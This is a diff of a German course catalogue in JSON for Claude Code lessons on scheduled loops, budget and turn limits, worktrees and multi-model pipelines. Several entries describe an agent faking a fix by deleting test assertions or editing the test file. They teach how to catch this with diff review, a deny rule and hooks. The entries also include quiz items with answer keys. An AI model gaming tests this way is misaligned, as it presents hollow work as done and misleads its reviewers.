+   "checkpoint": "Du kannst für eine wiederkehrende Aufgabe das passende Werkzeug wählen und sagen, wodurch sein Lauf endet.",
    "demo": null,
-   "example": "/schedule",
+   "example": "   /loop 1m Read status.txt and report its content in one line, prefixed with \"check N:\" where N counts how often you have run this prompt in this session.",
    "example_lang": "",
    "file": "s3-12-zeitgesteuert-arbeiten.md",
-   "glance": "Drei Werkzeuge, drei Arten aufzuhören. `/loop` wiederholt einen Prompt im Takt, solange deine Sitzung offen ist. `/goal` arbeitet Runde um Runde weiter, bis eine Bedingung erfüllt ist. `/schedule` legt eine Routine an, die nach Zeitplan in der Cloud läuft, auch wenn dein Laptop zu ist. Eine feste Kostengrenze bringt keins davon mit; wie du autonome Läufe begrenzt, zeigt [S3.13](s3-13-autonome-loops-absichern.md).",
+   "glance": "Drei Werkzeuge, drei Arten aufzuhören. `/loop` wiederholt einen Prompt im Takt, solange deine Sitzung offen ist. `/goal` arbeitet Runde um Runde weiter, bis eine Bedingung erfüllt ist. `/schedule` legt eine Routine an, die nach Zeitplan in der Cloud läuft, auch wenn dein Laptop zu ist. In den Doku-Seiten dazu steht bei keinem ein Kostenschalter: Grenzen setzt du über die Bedingung von `/goal`, die Sieben-Tage-Frist der Loops und die Stundenlimits der Routinen. Wie du autonome Läufe hart begrenzt, zeigt [S3.13](s3-13-autonome-loops-absichern.md).",
    "id": "S3.12",
    "level": "core",
-   "minutes": 15,
+   "minutes": 30,
    "offers": [],
    "order": 3120,
-   "outcome": "Ich kann für eine wiederkehrende Aufgabe begründet /loop (Takt, offene Sitzung), /goal (Bedingung) oder /schedule (Routine in der Cloud) wählen, eine davon einrichten und prüfen, dass sie auslöst.",
+   "outcome": "Ich kann für eine wiederkehrende Aufgabe begründet /loop (Takt, offene Sitzung), /goal (Bedingung) oder /schedule (Routine in der Cloud) wählen, /loop und /goal in einer Sitzung einrichten und an der Ausgabe prüfen, dass sie auslösen und enden.",
    "quiz": {
-    "correct": "`/loop` läuft im festen Takt und kostet pro Durchgang planbar; `/goal` läuft bis zur erfüllten Bedingung, die Rundenzahl ist offen.",
-    "q": "Welcher Unterschied zwischen `/goal` und `/loop` ist für die Kostenplanung entscheidend?",
+    "correct": "Claude wählt nach jedem Durchgang den Abstand selbst, zwischen einer Minute und einer Stunde. Der Loop endet mit der Sitzung oder nach sieben Tagen.",
+    "q": "Du gibst `/loop check whether CI passed` ein, ohne Intervall. Was stimmt?",
     "wrong": [
-     "`/loop` läuft auf Anthropics Servern weiter, wenn der Laptop zu ist, `/goal` nicht; deshalb ist `/loop` der offene Posten.",
-     "Der Unterschied ist nur die Syntax: `/goal` nimmt ganze Sätze, `/loop` Cron-Ausdrücke wie `/schedule`; die Kosten verhalten sich gleich.",
-     "Routinen sind die dauerhafte Form von `/loop`, und `/schedule` plant ein einmaliges `/goal`; beide haben dieselben offenen Kosten."
+     "Der Loop läuft nur einmal, denn ohne Intervall gibt es keinen Takt, und danach wartet Claude auf deinen nächsten Prompt, bis du ihn erneut startest.",
+     "Der Loop läuft im festen Takt von fünf Minuten, denn das ist der Standard, wenn du kein Intervall angibst, und er bleibt dabei, bis du ihn stoppst.",
+     "Der Loop läuft als Routine in der Cloud weiter, auch wenn du die Sitzung schließt, solange du angemeldet bleibst und das Abo aktiv ist."
     ]
    },
    "recall": [
-    "Was passiert mit einem `/loop`, wenn du die Sitzung schließt?",
-    "Woran erkennt `/goal`, dass es fertig ist?",
-    "Warum sieht eine Routine deine lokalen, nicht gepushten Änderungen nicht?"
+    "Was passiert mit einem `/loop`, wenn du die Sitzung schließt, und wann endet er sonst?",
+    "Woran erkennt `/goal`, dass es fertig ist, und was liest der Prüfer dafür?",
+    "Welches Werkzeug nimmst du für „jede Nacht um 02:00, auch wenn der Laptop zu ist“, und warum sieht es deine lokalen, nicht gepushten Änderungen nicht?"
    ],
    "requires": [
     "S2.4"
@@ -3243,8 +3263,8 @@
    "session": 3,
    "shelf": "automation",
    "skip_check": [
-    "Hast du schon einmal einen wiederkehrenden Auftrag mit `/loop` oder `/schedule` eingerichtet und geprüft, dass er wirklich ausgelöst wurde?",
-    "Kannst du ohne Nachschlagen sagen, wann `/goal` besser passt als `/loop` und warum die Kosten von `/goal` offen sind?"
+    "Kannst du ohne Nachschlagen sagen, wann `/goal` besser passt als `/loop`?",
+    "Weißt du, was mit einem `/loop` passiert, wenn du die Sitzung schließt?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/scheduled-tasks",
@@ -3258,34 +3278,38 @@
   },
   {
    "aliases": [],
-   "analogy": "Das Budget ist der Tank des Patrouillenfahrzeugs: Ist er leer, steht das Fahrzeug, statt bis zum Totalausfall weiterzufahren. Das Rundenlimit ist die Zahl der Runden im Fahrtenbefehl. Der Worktree ist der Prüfstand im Labor, ein Nachbau der Anlage, an dem der Nachtjob schrauben darf, ohne die echte Anlage anzufassen. Und `worktree.baseRef` auf `fresh` ist der verplombte Ausgangszustand zu Schichtbeginn: Jede Nachtpatrouille startet von derselben geprüften Basis.",
-   "answers": null,
+   "analogy": "Das Budget ist der Tank des Patrouillenfahrzeugs: Ist er leer, steht das Fahrzeug, statt bis zum Totalausfall weiterzufahren. Das Rundenlimit ist die Zahl der Runden im Fahrtenbefehl. Der Worktree ist der Prüfstand im Labor, ein Nachbau der Anlage, an dem der Nachtjob schrauben darf, ohne die echte Anlage anzufassen.",
+   "answers": [
+    "`--max-budget-usd` und `--max-turns`. Beim Rundenlimit endet der Lauf mit einem Fehler.",
+    "Mit einer Runden- oder Zeitklausel in der Bedingung. Ein Modell beurteilt sie aus dem Gespräch, deshalb ist sie weich; hart wird die Grenze erst mit `claude -p` und `--max-turns`.",
+    "Einen Worktree unter `.claude/worktrees/<name>/` mit dem Branch `worktree-<name>`. Ohne Dialog am Ende räumt Claude nicht auf: Du entfernst ihn mit `git worktree remove` (bei Sperre erst `git worktree unlock`) und den Branch mit `git branch -D`."
+   ],
    "area": "automation",
-   "checkpoint": "Du kannst erklären, warum jeder unbeaufsichtigte Lauf ein Budget und ein Rundenlimit braucht, was in einer interaktiven Sitzung stattdessen begrenzt und wie ein Worktree deinen Hauptbranch schützt.",
+   "checkpoint": "Du kannst einen unbeaufsichtigten Lauf mit Budget und Rundenlimit in einem Worktree starten, den Stopp ablesen und sagen, was interaktiv stattdessen begrenzt.",
    "demo": "../moderation/vorfuehren/s3-13-autonome-loops-absichern.md",
-   "example": "git worktree add ../experiment-async-processing -b feature/async-experiment\ncd ../experiment-async-processing\nclaude\n# Make experimental changes — the main branch stays untouched",
+   "example": "   claude -p --worktree kette-kurz --model haiku --permission-mode dontAsk --max-turns 2 --max-budget-usd 0.50 \"Read notes-1.txt. Each file names the next file to read, until one says END. Follow the chain one file at a time and report the file names in order.\"",
    "example_lang": "bash",
    "file": "s3-13-autonome-loops-absichern.md",
-   "glance": "Setz die Grenzen, bevor ein autonomer Lauf startet: `--max-budget-usd` deckelt die Kosten, `--max-turns` die Zahl der Runden, und `--worktree` sperrt den Lauf in einen eigenen Arbeitsbaum, damit dein Hauptbranch unberührt bleibt. Beide Limits wirken nur im Print-Modus (`claude -p`); in einer interaktiven Sitzung greifen sie nicht, dort begrenzt du `/goal` über eine Runden- oder Zeitklausel in der Bedingung und stoppst `/loop` selbst.",
+   "glance": "Setz die Grenzen, bevor ein autonomer Lauf startet: `--max-budget-usd` deckelt die Kosten, `--max-turns` die Zahl der Runden, und `--worktree` lässt den Lauf in einem eigenen Arbeitsordner arbeiten, damit dein Hauptordner unberührt bleibt. Beide Limits wirken nur im Print-Modus (`claude -p`), der einen einzelnen Lauf ohne Dialog startet: Auftrag hinein, Antwort heraus, Ende (mehr dazu in [S4.3](s4-03-headless.md)). In einer interaktiven Sitzung greifen sie nicht; dort begrenzt du `/goal` über eine Runden- oder Zeitklausel in der Bedingung und stoppst `/loop` selbst.",
    "id": "S3.13",
    "level": "core",
-   "minutes": 12,
+   "minutes": 25,
    "offers": [],
    "order": 3130,
-   "outcome": "Ich kann einen unbeaufsichtigten Lauf mit --max-budget-usd und --max-turns deckeln, ihn in einem eigenen Worktree laufen lassen und sagen, was eine interaktive Sitzung stattdessen begrenzt.",
+   "outcome": "Ich kann einen unbeaufsichtigten Lauf mit --max-budget-usd und --max-turns deckeln, ihn in einem eigenen Worktree laufen lassen, den Stopp am Ergebnis ablesen und sagen, was eine interaktive Sitzung stattdessen begrenzt.",
    "quiz": {
     "correct": "Nichts davon: Das Flag wirkt nur mit `-p`. Hart wird die Grenze erst, wenn der Lauf mit `claude -p` startet.",
     "q": "Du startest eine interaktive Sitzung mit `claude --max-budget-usd 1.00` und setzt darin `/goal alle Tests grün`. Was begrenzt die Kosten dieses Laufs hart?",
     "wrong": [
-     "Das Budget-Flag, denn es gilt ab dem Start für jede Sitzung, die du mit ihm aufrufst, auch für eine interaktive.",
-     "Der Prüfer von `/goal`, denn er bricht den Lauf von selbst ab, sobald ein Dollar Budget verbraucht ist.",
-     "Der Worktree, denn jeder isolierte Lauf bekommt von Claude Code ein eigenes festes Budget zugeteilt."
+     "Das Budget-Flag, denn es gilt ab dem Start für jede Sitzung, die du mit ihm aufrufst, auch für eine interaktive Sitzung.",
+     "Der Prüfer von `/goal`, denn er bricht den Lauf von selbst ab, sobald ein Dollar Budget in der Sitzung verbraucht ist.",
+     "Der Worktree, denn jeder isolierte Lauf bekommt von Claude Code ein eigenes festes Budget zugeteilt, das er nicht überschreitet."
     ]
    },
    "recall": [
-    "Welche zwei Flags deckeln einen `claude -p`-Lauf, und was passiert, wenn eines davon erreicht ist?",
-    "Warum ist eine interaktive Sitzung, die mit `claude --max-budget-usd 1.00` startet, nicht gedeckelt?",
-    "Von wo zweigt ein Worktree mit `worktree.baseRef: \"fresh\"` ab, und warum passt das für Nachtläufe?"
+    "Welche zwei Flags deckeln einen `claude -p`-Lauf, und was passiert, wenn das Rundenlimit erreicht ist?",
+    "Wie begrenzt du ein `/goal` in einer interaktiven Sitzung, und warum ist das keine harte Grenze?",
+    "Was hinterlässt ein `claude -p --worktree`-Lauf auf deiner Platte, und wie räumst du es auf?"
    ],
    "requires": [
     "S3.12",
@@ -3305,8 +3329,8 @@
    "session": 3,
    "shelf": "automation",
    "skip_check": [
-    "Hast du schon einmal einen autonomen Lauf mit `--max-budget-usd` gestartet und gesehen, wie er beim Limit stoppt?",
-    "Kannst du ohne Nachschlagen erklären, wie ein Lauf mit `--worktree` deinen Hauptbranch vor einem Nachtjob schützt?"
+    "Weißt du, mit welchem Start ein `--max-budget-usd` überhaupt greift?",
+    "Kannst du sagen, was ein Lauf in einem Worktree nach seinem Ende auf deiner Platte hinterlässt?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/cli-reference",
@@ -3321,34 +3345,38 @@
   },
   {
    "aliases": [],
-   "analogy": "Stell dir ein Intrusion-Detection-System vor, das seine Signaturen selbst aktualisiert. Es erkennt ein neues Angriffsmuster (Analyse), plant eine Gegenregel (Planung), testet sie im Sandbox-Modus ohne Wirkung auf den Betrieb (TDD), prüft, dass keine Fehlalarme entstehen (Quality Gate), und schreibt die Signatur in die Live-Datenbank (Commit). Gefährlich wird es, wenn das System lernt, Fehlalarme zu unterdrücken, statt seine Signaturen zu verbessern: Das ist der Schein-Fix in Reinform.",
-   "answers": null,
+   "analogy": "Stell dir ein Intrusion-Detection-System vor, das seine Signaturen selbst aktualisiert. Es erkennt ein neues Angriffsmuster, plant eine Gegenregel, prüft sie zuerst an aufgezeichnetem Verkehr und schreibt sie erst danach in die Live-Datenbank. Gefährlich wird es, wenn das System lernt, Fehlalarme zu unterdrücken, statt seine Signaturen zu verbessern: Das ist der Schein-Fix in Reinform. Und eine Signatur, die ein Mensch nie gelesen hat, kann falsch sein.",
+   "answers": [
+    "Beobachten, festhalten, neu laufen, vergleichen. `CLAUDE.md` wird beim Start der Sitzung geladen; in der laufenden Sitzung hat Claude die neue Zeile nicht.",
+    "Claude behandelt `CLAUDE.md` als Kontext, nicht als erzwungene Konfiguration. Was in jedem Fall verhindert werden muss, blockt ein PreToolUse-Hook, unabhängig davon, was Claude entscheidet.",
+    "Kostenlauf: Budget und Rundenlimit mit `claude -p`. Schein-Fix: den Diff auf entfernte Assertions lesen oder einen Hook, der sie blockt. Falsche Regel: ein Mensch liest sie, bevor sie bleibt."
+   ],
    "area": "automation",
-   "checkpoint": "Du kannst die vier häufigsten Fehlerbilder des Self-Improve-Loops nennen, jedem eine Gegenmaßnahme zuordnen und erklären, warum der Loop an Hardware-Endpunkten nach EN 50131 nicht ohne Freigabe-Gate laufen darf.",
+   "checkpoint": "Du kannst das Muster mit Bordmitteln durchspielen und seine Grenzen nennen.",
    "demo": "../moderation/vorfuehren/s3-14-self-improve-loop.md",
-   "example": "/goal all tests in test/auth pass and the lint step is clean",
-   "example_lang": "",
+   "example": "   # Conventions\n\n   - Every function name in shop.py starts with the prefix `shop_`, for example `shop_total`.",
+   "example_lang": "markdown",
    "file": "s3-14-self-improve-loop.md",
-   "glance": "Ein Self-Improve-Loop sucht die größte Schwäche eines Projekts, plant einen gezielten Fix, schreibt zuerst einen fehlschlagenden Test, setzt um und committet nur, wenn ein Quality Gate grün ist; dann beginnt die nächste Runde. Gezeigt wird das Muster am 🔧 Custom-Plugin `agentic-os`, nicht an einer Funktion von Claude Code. Es ist ein Experiment, das nur mit Budget-Grenze, Quality Gate und Iterationslimit taugt, denn ein grünes Gate beweist nicht, dass ein Fix echt ist.",
+   "glance": "Ein Self-Improve-Loop ist ein Muster: eine Schwäche beobachten, eine Gegenmaßnahme festhalten, mit ihr noch einmal laufen und das Ergebnis vergleichen. Mit Bordmitteln heißt das: ein Fehler, eine Zeile in `CLAUDE.md`, ein zweiter Lauf. Claude Code behandelt `CLAUDE.md` laut Doku als Kontext, nicht als erzwungene Konfiguration: Eine Regel macht ein Verhalten wahrscheinlicher, nicht sicher. Je automatischer ein solcher Kreislauf wird (Claude schreibt Regeln, Tests und Commits selbst), desto wichtiger werden Grenzen: ein Budget, ein Rundenlimit, ein Mensch, der den Diff liest. Ein grünes Testergebnis beweist nicht, dass ein Fix echt ist.",
    "id": "S3.14",
    "level": "bonus",
-   "minutes": 15,
+   "minutes": 20,
    "offers": [],
    "order": 3140,
-   "outcome": "Ich kann die sechs Schritte eines Self-Improve-Loops mit Quality Gate erklären und seine Grenzen benennen: Kostenlauf, Schein-Fixes durch entfernte Assertions, Memory-Drift und regulierte Hardware.",
+   "outcome": "Ich kann das Muster „Fehler beobachten, Regel festhalten, neu laufen und vergleichen“ mit Bordmitteln durchspielen (eine Zeile in CLAUDE.md und ein zweiter Lauf) und seine Grenzen benennen: keine Garantie, falsche Regeln, Schein-Fixes, ein Mensch prüft.",
    "quiz": {
-    "correct": "Er entsteht nur bei grünen Tests und ausreichendem Score; ein Schein-Fix umgeht das, wenn Claude die Assertion löscht.",
-    "q": "Was unterscheidet einen Commit hinter dem Quality Gate von einem normalen Commit, und welches Fehlerbild umgeht diesen Schutz trotzdem?",
+    "correct": "Den Diff der Testdateien lesen, ob Assertions fehlen, denn ein grüner Lauf kann auch heißen, dass der Test weniger prüft als vorher.",
+    "q": "Nach einem autonomen Lauf sind alle Tests grün. Welche Prüfung brauchst du als Nächstes?",
     "wrong": [
-     "Er unterscheidet sich nur im Format der Commit-Nachricht; einen Schutz über die normale Git-Mechanik hinaus gibt es nicht.",
-     "Er entsteht nur bei grünen Tests; ein Kostenlauf umgeht das, weil zu hoher Verbrauch die Prüfung des Gates überspringt.",
-     "Er wird im Gedächtnis protokolliert; Memory-Drift umgeht das, weil `.agent-memory/` die Assertions direkt umschreibt."
+     "Keine, denn Tests sind der Nachweis; ein grüner Lauf zeigt, dass der Fehler im Code behoben ist und nicht im Test.",
+     "Das Budget-Limit kontrollieren, denn ein eingehaltenes Budget zeigt, dass der Lauf keine Schein-Fixes geschrieben hat.",
+     "Die Commit-Nachricht lesen, denn eine ausführliche Nachricht belegt, dass die Änderung am Code und nicht am Test erfolgte."
     ]
    },
    "recall": [
-    "Welche sechs Schritte hat eine Iteration, und wann wird committet?",
-    "Warum ist ein grünes Quality Gate kein Beweis für einen echten Fix?",
-    "Was hält das Gedächtnis fest, und welches Risiko entsteht daraus?"
+    "Welche vier Schritte hat das Muster, und warum startest du für den zweiten Lauf eine neue Sitzung?",
+    "Warum ist eine Regel in `CLAUDE.md` keine Garantie, und was blockt einen Verstoß in jedem Fall?",
+    "Ordne zu: Welche Gegenmaßnahme gehört zu einem Kostenlauf, zu einem Schein-Fix und zu einer falschen Regel?"
    ],
    "requires": [
     "S3.13"
@@ -3368,7 +3396,7 @@
    "session": 3,
    "shelf": "automation",
    "skip_check": [
-    "Hast du schon einmal einen autonomen Verbesserungs-Loop mit Quality Gate und Iterationsgrenze laufen lassen und danach die Commits selbst geprüft?",
+    "Hast du schon einmal aus einem Fehler von Claude eine Regel in `CLAUDE.md` gemacht und danach geprüft, ob sie beim nächsten Lauf greift?",
     "Kannst du ohne Nachschlagen sagen, woran du einen Schein-Fix erkennst, bei dem ein Test nur grün wird, weil die Assertion fehlt?"
    ],
    "sources": [
@@ -3382,28 +3410,32 @@
   {
    "aliases": [],
    "analogy": "",
-   "answers": null,
+   "answers": [
+    "Der Lauf arbeitet in einem Worktree, und ein Worktree enthält nur, was eingecheckt ist. Regeln und Agent, die nur im Hauptordner liegen, gäbe es dort nicht. Dazu kam Schritt 5: Die Allow-Regeln gelten erst, seit du den Ordner einmal als vertrauenswürdig bestätigt hast.",
+    "Die Deny-Regel `Edit(test_calc.py)`: Sie blockt in jedem Modus. Gewarnt hätte dich Schritt 7: `git status --short` im Worktree hätte die Testdatei als geändert gezeigt.",
+    "Der Subagent ist dasselbe Modell wie der Lauf und kann sich im selben Punkt irren; sein Urteil ist ein zweiter Blick. Der Beleg war der Testlauf nach deinem Merge, zusammen mit dem Diff, den du selbst gelesen hast."
+   ],
    "area": null,
-   "checkpoint": "Du kannst eine Übung aus Session 3 passend zu deinem Projekt wählen, sie bis zu ihrer Liste „Geschafft, wenn\" durcharbeiten und erklären, warum die Teile einer Fan-out-Aufgabe wirklich unabhängig voneinander sein müssen.",
+   "checkpoint": "Du kannst einen Lauf ohne dich so aufsetzen, dass Regeln, Grenzen, Worktree, Gegenprüfung und deine Übernahme ineinandergreifen, und für jede Schicht sagen, was sie abdeckt.",
    "demo": null,
-   "example": null,
-   "example_lang": "",
+   "example": "   {\n     \"permissions\": {\n       \"allow\": [\n         \"Edit\",\n         \"Bash(python -m unittest*)\", \"Bash(python3 -m unittest*)\",\n         \"PowerShell(python -m unittest*)\", \"PowerShell(python3 -m unittest*)\"\n       ],\n       \"deny\": [\"Edit(test_calc.py)\"]\n     }\n   }",
+   "example_lang": "json",
    "file": "s3-15-praxis-station-3.md",
-   "glance": "Hier wählst du eine Übung aus Session 3: eine erste Aufgabe mit mehreren Agenten, ein Security-Audit am Playground oder einen Domänen-Parser mit TDD. In die 15 Minuten der Station passt die Aufgabe mit mehreren Agenten; Audit und Parser brauchen 25–30 Minuten. Die Prioritätenliste unten zeigt, welche Übungen der fortgeschrittenen Sessions zuerst kommen und in welchem Kapitel sie heute stehen.",
+   "glance": "Diese Station schließt Session 3 ab. Du lässt Claude einmal ohne dich arbeiten und hältst dabei alle Fäden in der Hand: Regeln legen fest, was der Lauf darf, ein Rundenlimit und ein Budget begrenzen ihn, er arbeitet in einem eigenen Worktree, ein zweiter Agent prüft das Ergebnis gegen, und in deinen Hauptordner kommt es erst, wenn du es gelesen hast. Das dauert etwa 20 Minuten und kostet einen kleinen Lauf mit `sonnet`.",
    "id": "S3.15",
    "level": "core",
-   "minutes": 15,
+   "minutes": 25,
    "offers": [
     "S3.4",
     "S3.6"
    ],
    "order": 3150,
-   "outcome": "Ich kann eine Übung aus Session 3 (mehrere Agenten, Security-Audit oder Domänen-Parser) passend zu meinem Projekt auswählen, sie selbstständig durchführen und an ihrer Liste „Geschafft, wenn“ belegen, dass sie gelungen ist.",
+   "outcome": "Ich kann die Bausteine aus Session 3 in einem Ablauf verbinden: Regeln für einen Lauf ohne mich, ein gedeckelter Lauf in einem Worktree, ein eigener Subagent als Gegenprüfung und die Übernahme erst nach meiner Prüfung.",
    "quiz": null,
    "recall": [
-    "Welche Übungen der Prioritätenliste gehören zu Session 3, welche zu Session 4?",
-    "Woran erkennst du, dass eine Aufgabe Fan-out verträgt und keine Pipeline braucht?",
-    "Warum committest du keine Fixes an den Schwachstellen im Playground?"
+    "Warum mussten die Regeln und der Subagent eingecheckt sein, bevor der Lauf startete?",
+    "Was hat verhindert, dass der Lauf die Tests durch eine Änderung an der Testdatei grün macht, und was hätte dich gewarnt, wenn es doch passiert wäre?",
+    "Der Subagent nannte die Änderung einen echten Fix. Warum war das noch kein Beleg, und was war der Beleg?"
    ],
    "requires": [],
    "requires_all": [],
@@ -3412,7 +3444,7 @@
    "shelf": "practice",
    "skip_check": [],
    "sources": [],
-   "title": "Praxis-Station Session 3: eine Übung wählen",
+   "title": "Praxis-Station Session 3: alles in einem Ablauf",
    "transferable": false,
    "type": "practice"
   },
@@ -3478,34 +3510,38 @@
    "aliases": [
     "3.2"
    ],
-   "analogy": "Mehr-Modell-Orchestrierung ist der Dienstplan einer Sicherheitsfirma bei einer neuen Türanlage. Der Senior-Architekt schreibt die Leistungsbeschreibung mit den Sicherheitsanforderungen. Die Techniker montieren Leser und verlegen Kabel parallel auf mehreren Etagen. Eine Junior-Streife macht den ersten, günstigen Kontrollgang und meldet Auffälliges. Die Abnahme unterschreibt der Senior-Ingenieur: jede Tür, jeder Leser, jede Kabeltrasse. Niemand lässt den Senior selbst Kabel ziehen, und niemand lässt die Junior-Streife die Anlage abnehmen.",
-   "answers": null,
+   "analogy": "Mehr-Modell-Orchestrierung ist der Dienstplan einer Sicherheitsfirma bei einer neuen Türanlage. Der Senior-Architekt schreibt die Leistungsbeschreibung mit den Sicherheitsanforderungen. Die Techniker montieren Leser und verlegen Kabel. Eine Junior-Streife macht den ersten, günstigen Kontrollgang und meldet Auffälliges. Der Senior-Ingenieur nimmt ab: Bei einer Hausmeister-Tür liest er die gemeldeten Stellen, bei der Tür zum Serverraum jede Kabeltrasse selbst. Niemand lässt den Senior selbst Kabel ziehen, und niemand lässt die Junior-Streife allein abnehmen.",
+   "answers": [
+    "`opus` plant (komplexes Reasoning, ein guter Plan spart später Arbeit), `sonnet` setzt um (alltägliches Coding, hier fließt die Masse der Tokens), `haiku` macht den ersten Prüfdurchgang (einfach, günstig).",
+    "Es spart, wenn `opus` danach nur die markierten Stellen und die Spezifikation liest. Es spart nichts, wenn `opus` ohnehin den gesamten Code liest, etwa bei sicherheitskritischem Code: Dann ist der Haiku-Lauf zusätzlich bezahlt.",
+    "Im Plan-Modus nimmt es `opus`, für die Umsetzung `sonnet`; `/cost` nennt unter „Usage by model“ beide Modelle. `/model <name>` verhält sich wie Enter in der Auswahl und speichert deine Wahl als Standard, `--model` gilt nur für die Sitzung."
+   ],
    "area": "cost",
-   "checkpoint": "Du kannst für eine konkrete Aufgabe, etwa einen Refactor des Wiegand-Frame-Parsers, die drei Phasen den passenden Modellen zuordnen und die Wahl mit Kosten und Urteilsbedarf begründen.",
+   "checkpoint": "Du kannst für eine Aufgabe die drei Phasen den passenden Modellen zuordnen, die Wahl mit Kosten und Urteilsbedarf begründen und in `/cost` ablesen, welche Modelle genutzt wurden.",
    "demo": null,
-   "example": "# Plan und Umsetzung: opus im Plan-Modus, danach automatisch sonnet\nclaude --model opusplan\n\n# Erste Prüfung, neue Sitzung: das günstige Tier\nclaude --model haiku\n\n# Strittige Punkte, neue Sitzung: das starke Tier entscheidet\nclaude --model opus",
+   "example": "# Plan und Umsetzung: opus im Plan-Modus, danach sonnet\nclaude --model opusplan\n\n# Erste Prüfung, neue Sitzung: das günstige Tier\nclaude --model haiku\n\n# Strittige Punkte, neue Sitzung: das starke Tier entscheidet\nclaude --model opus",
    "example_lang": "text",
    "file": "s4-01-modell-pro-phase.md",
-   "glance": "Die Kernfrage ist nicht „Welches Modell ist besser?“, sondern „Welche Phase dieser Aufgabe braucht tiefes Urteil und welche Durchsatz?“. Das Opus-Tier plant und nimmt ab, wo Urteil zählt; die Masse der Umsetzung übernimmt das Sonnet-Tier oder ein zweiter Anbieter wie Codex; den ersten, günstigen Prüfdurchgang macht das Haiku-Tier und gibt Strittiges an Opus weiter.",
+   "glance": "Die Kernfrage ist nicht „Welches Modell ist besser?“, sondern „Welche Phase dieser Aufgabe braucht tiefes Urteil und welche Durchsatz?“. Die Doku beschreibt `opus` für komplexes Reasoning, `sonnet` für alltägliche Coding-Aufgaben und `haiku` für einfache Aufgaben. Daraus folgt eine Zuordnung: `opus` plant, `sonnet` setzt um, `haiku` macht einen günstigen ersten Prüfdurchgang.",
    "id": "S4.1",
    "level": "deep-dive",
-   "minutes": 15,
+   "minutes": 25,
    "offers": [],
    "order": 4010,
-   "outcome": "Ich kann eine Aufgabe in Plan-, Umsetzungs- und Review-Phase zerlegen und je Phase ein Modell mit Kosten- und Urteilsbegründung wählen.",
+   "outcome": "Ich kann eine Aufgabe in Plan-, Umsetzungs- und Prüfphase zerlegen, je Phase ein Modell mit Kosten- und Urteilsbegründung wählen und mit /cost ablesen, welche Modelle eine Sitzung genutzt hat.",
    "quiz": {
-    "correct": "Wenn er strittig ist oder Urteil braucht, etwa bei einem Architektur-Kompromiss oder einem Sicherheits-Grenzfall.",
-    "q": "In deiner Pipeline macht `haiku` die erste Review-Runde über den Code der Umsetzungsphase. Wann gibst du einen Befund an `opus` weiter?",
+    "correct": "Ich lasse `opus` die sicherheitsrelevanten Teile selbst lesen, denn „kein Befund“ eines günstigen Durchgangs beweist nicht, dass nichts da ist.",
+    "q": "`haiku` hat den Diff der Zutrittslogik einer Firmware geprüft und meldet keine Befunde. Was machst du?",
     "wrong": [
-     "Immer, weil Haiku im Review nur Tippfehler und Formatierung erkennen kann und sonst gar nichts meldet.",
-     "Nie, weil Codex seinen Code vor der Rückgabe selbst prüft und eine zweite Instanz daher überflüssig ist.",
-     "Bei allen Sicherheitsbefunden, weil Haiku Sicherheitsprüfungen aus Kostengründen grundsätzlich gar nicht erst durchführt."
+     "Ich betrachte den Diff als geprüft, denn ein Modell, das nichts meldet, hat nach allem, was es gesehen hat, nichts Auffälliges gefunden.",
+     "Ich starte `haiku` so lange neu, bis es einen Befund meldet, denn ein Review ist erst fertig, wenn mindestens ein Punkt auf der Liste steht.",
+     "Ich lasse `opus` nur die Commit-Nachricht lesen, denn die fasst die Änderung vollständig zusammen und erspart das Lesen des Codes."
     ]
    },
    "recall": [
-    "Warum gehören Planung und Abnahme auf das Opus-Tier, die Masse der Umsetzung aber nicht?",
-    "Was macht Haiku im Review, und wann geht ein Befund an Opus?",
-    "Was macht der Modellwert `opusplan`, und welche Phase deckt er nicht ab?"
+    "Welcher Alias gehört in welche Phase, und womit begründest du es?",
+    "Wann spart der Haiku-Erstdurchgang Geld, und wann nicht?",
+    "Was macht `opusplan`, was zeigt `/cost` danach, und warum startest du Experimente mit `--model` statt mit `/model <name>`?"
    ],
    "requires": [
     "S1.7",
@@ -3523,8 +3559,8 @@
    "session": 4,
    "shelf": "cost",
    "skip_check": [
-    "Kannst du ohne Nachschlagen erklären, warum Planung und Abnahme auf das stärkste Modell gehören, die Masse der Umsetzung aber nicht?",
-    "Hast du schon einmal einen Ablauf gebaut, in dem ein günstiges Modell zuerst prüft und nur strittige Punkte an das teure Modell gehen?"
+    "Kannst du ohne Nachschlagen sagen, welches Modell `opusplan` im Plan-Modus und welches es danach nimmt?",
+    "Weißt du, wann ein günstiger Erstdurchgang im Review wirklich Geld spart und wann nicht?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/model-config",
@@ -3537,33 +3573,37 @@
   {
    "aliases": [],
    "analogy": "Der Codex-Schwarm ist ein externes Montageteam. Der Generalunternehmer (Claude) plant und nimmt ab, der Subunternehmer (Codex bei OpenAI) montiert parallel auf mehreren Etagen. Das geht schnell, aber der Subunternehmer ist ein anderer Anbieter und sieht alles, was im Montageplan steht. Stehen dort vertrauliche Details des Sicherheitskonzepts, etwa die Alarmzonen, die Berechtigungsmatrix oder die toten Winkel der Kameras, hast du ein Datenschutzproblem. Die Lösung: Der Subunternehmer bekommt nur den Kabelplan, nicht das Sicherheitskonzept.",
-   "answers": null,
+   "answers": [
+    "Für den Codex-Teil gelten die Aufbewahrungs- und Trainingsregeln deines OpenAI-Vertrags; die Datenregeln von Anthropic gelten nur für die Claude-Seite der Pipeline.",
+    "Codex weglassen: `sonnet` setzt um, die Kosten steigen etwas. Lokales Modell: kein Dritter, aber du brauchst eigene Hardware und eine Anbindung. Nur Signaturen: das Gerüst ohne Inhalt, aber der Anbieter kann keine Logik ändern, und Namen können Fachlogik verraten.",
+    "Der Anbieter bräuchte den Inhalt der Datei, ein Gerüst zeigt ihn nicht. Du lässt den Codex-Schritt für diese Datei weg oder nimmst ein lokales Modell."
+   ],
    "area": "agents",
-   "checkpoint": "Du kannst die Datenfluss-Grenze im Codex-Schwarm erklären, die drei Optionen für sensiblen Code nennen und begründen, ob euer Firmware-Code an Codex gehen darf.",
+   "checkpoint": "Du kannst die Datenfluss-Grenze im Codex-Schwarm erklären, Dateien eines Projekts einteilen und für sensiblen Code eine der drei Optionen begründen.",
    "demo": "../moderation/vorfuehren/s4-02-codex-schwarm.md",
    "example": "/multi-model-orchestrator:codex-swarm --decompose \"Build a Python CLI with scan, check, report commands\"",
    "example_lang": "",
    "file": "s4-02-codex-schwarm.md",
